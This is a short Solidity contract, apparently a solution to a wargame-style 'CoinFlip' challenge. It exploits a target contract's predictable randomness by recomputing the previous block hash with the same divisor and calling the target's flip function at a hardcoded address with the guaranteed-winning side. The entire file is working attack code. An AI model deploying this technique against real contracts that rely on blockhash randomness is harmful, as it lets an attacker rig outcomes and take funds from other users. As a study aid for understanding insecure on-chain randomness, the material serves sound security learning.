// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol"; 

contract CoinflipAttack {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public exploitedContract;

  constructor() {
    exploitedContract = CoinFlip(0xC076A8989C16b93cC250C16dD326607bD6bbB60a);
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    exploitedContract.flip(side);
    return side;
  }
}